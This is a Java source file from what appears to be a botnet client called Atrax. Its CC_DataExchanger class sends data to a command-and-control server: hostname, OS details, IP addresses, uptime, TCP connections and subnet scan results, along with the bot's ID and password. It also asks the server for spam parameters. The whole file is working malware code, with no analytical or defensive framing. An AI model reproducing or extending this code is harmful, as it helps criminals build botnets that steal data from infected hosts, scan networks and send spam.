
package Atrax.atrax_client_bot;

import java.io.IOException;

/**
 *
 * this class:
 *  encodes the data we are sending to the C&C
 *  handles the reply from the C&C
 */
public class CC_DataExchanger {
    
    // empty constructor
    public CC_DataExchanger(){
    };
    
    /**********************************
     * sendHostDetails
     * THIS METHOD WILL SEND 
     * DETAILED INFORMATION TO THE C&C
     * ABOUT THE HOST
     * @param theBot
     * @param debug
     * @return 
     * @throws java.io.IOException 
     **********************************/
    public String sendHostDetails(bot theBot, Boolean debug) throws IOException{
        HostDetails theHost;
        theHost = new HostDetails();
        
        String[][] thePostArray = new String[9][2];
        
        thePostArray[0][0] = "botPwd";
        thePostArray[0][1] = theBot.ccInitPwd;
        thePostArray[1][0] = "status";
        thePostArray[1][1] = theBot.status;
        thePostArray[2][0] = "botID";
        thePostArray[2][1] = theBot.botID;
        thePostArray[3][0] = "hostName";
        thePostArray[3][1] = theHost.hostName;
        thePostArray[4][0] = "osName";
        thePostArray[4][1] = theHost.osName;
        thePostArray[5][0] = "osVersion";
        thePostArray[5][1] = theHost.osVersion;
        thePostArray[6][0] = "osArch";
        thePostArray[6][1] = theHost.osArch;
        thePostArray[7][0] = "hostUpTime";
        thePostArray[7][1] = theHost.hostUpTime;
        thePostArray[8][0] = "hostIps";
        thePostArray[8][1] = theHost.hostIps;
        
        CC_Connector the_cc_Connector = new CC_Connector(thePostArray,
                theBot.ccInitURL, debug);
        
        
        return the_cc_Connector.ccReply;
    }
    
    /**************************************
     * this method:
     * sends the report of the very first
     * initial connection to the C&C
     * that the bot attempts
     * @param theBot
     * @param debug 
     * @return
     * @throws java.io.IOException
     **************************************/
    public String makeInitialConnection (bot theBot, Boolean debug) throws IOException{
        String[][] thePostArray = new String[2][2];
        
        thePostArray[0][0] = "botPwd";
        thePostArray[0][1] = theBot.ccInitPwd;
        thePostArray[1][0] = "status";
        thePostArray[1][1] = theBot.status;
        
        CC_Connector the_cc_Connector;
        the_cc_Connector = new CC_Connector(thePostArray, theBot.ccInitURL, debug);
                
        return the_cc_Connector.ccReply;
    }
    
    /*************************************
     * this method:
     * manages the sending of the regular 
     * ongoing reports to the C&C 
     * @param theBot
     * @param tcpConnections
     * @param debug
     * @return 
     * @throws java.io.IOException 
     *************************************/
    public String sendOngoingReport(bot theBot, String tcpConnections, Boolean debug) throws IOException{
        HostDetails theHost = new HostDetails();
        mailer theMailer = new mailer(theBot);
        
        String[][] thePostArray = new String[6][2];
        
        thePostArray[0][0] = "botPwd";
        thePostArray[0][1] = theBot.ccInitPwd;
        thePostArray[1][0] = "status";
        thePostArray[1][1] = theBot.status;
        thePostArray[2][0] = "botID";
        thePostArray[2][1] = theBot.botID;
        thePostArray[3][0] = "hostUpTime";
        thePostArray[3][1] = theHost.hostUpTime;
        thePostArray[4][0] = "tcpConnections";
        thePostArray[4][1] = tcpConnections;
        thePostArray[5][0] = "SMTPmode";
        thePostArray[5][1] = theMailer.mode;
        
        CC_Connector the_cc_Connector;
        the_cc_Connector = new CC_Connector(thePostArray, theBot.ccInitURL, debug);
        
        return the_cc_Connector.ccReply;
    }
    
    /*****************************
     * this method:
     * sends subnet scan results to the C&C
     * 
     * @param theBot
     * @param subnetScanResults
     * @param debug
     * @return 
     * @throws java.io.IOException 
     */
    public static String sendSubnetScanReport(bot theBot, String subnetScanResults, Boolean debug) throws IOException {
        String[][] thePostArray;
        thePostArray = new String[4][2];
        
        thePostArray[0][0] = "botPwd";
        thePostArray[0][1] = theBot.ccInitPwd;
        thePostArray[1][0] = "status";
        thePostArray[1][1] = theBot.status;
        thePostArray[2][0] = "botID";
        thePostArray[2][1] = theBot.botID;
        thePostArray[3][0] = "subnetScan";
        thePostArray[3][1] = subnetScanResults;
        
        CC_Connector the_cc_Connector = new CC_Connector(thePostArray, theBot.ccInitURL, debug);
        
        return the_cc_Connector.ccReply;
    }
    
    /*******************************************
     * this method handles:
     * request the spam parameters from the C&C
     * @param theBot
     * @param debug
     * @return 
     * @throws java.io.IOException 
     *******************************************/
    public static String requestSpamParameters (bot theBot, Boolean debug) throws IOException {
        mailer theMailer = new mailer(theBot);
        
        String[][] thePostArray = new String[4][2];
        
        thePostArray[0][0] = "botpwd";
        thePostArray[0][1] = theBot.ccInitPwd;
        thePostArray[1][0] = "status";
        thePostArray[1][1] = theBot.status;
        thePostArray[2][0] = "botid";
        thePostArray[2][1] = theBot.botID;
        thePostArray[3][0] = "SMTPmode";
        thePostArray[3][1] = theMailer.mode;
        
        CC_Connector the_cc_Connector = new CC_Connector(thePostArray, theBot.ccInitURL, debug);
        
        return the_cc_Connector.ccReply;
    }
}
